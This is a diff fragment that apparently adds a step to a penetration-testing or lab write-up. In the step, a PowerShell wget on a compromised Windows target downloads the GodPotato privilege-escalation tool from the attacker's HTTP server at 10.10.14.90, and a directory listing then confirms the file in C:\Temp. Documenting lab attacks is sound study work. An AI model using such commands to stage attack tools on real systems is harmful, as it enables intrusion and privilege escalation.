@@ -770,5 +770,22 @@ Serving HTTP on 0.0.0.0 port 1001 (http://0.0.0.0:1001/) ...
 Ive downloaded it from github and ill host it using this
 
 ```python
+SHELL> powershell -c wget http://10.10.14.90:1001/GodPotato-NET4.exe -o godpotato.exe
+SHELL> dir
+
+
+    Directory: C:\Temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----         4/1/2026   3:34 PM          57344 godpotato.exe                                                         
+
+
+SHELL> 
+```
+This tranferred godpotato to the target
+
+```python
 
 ```
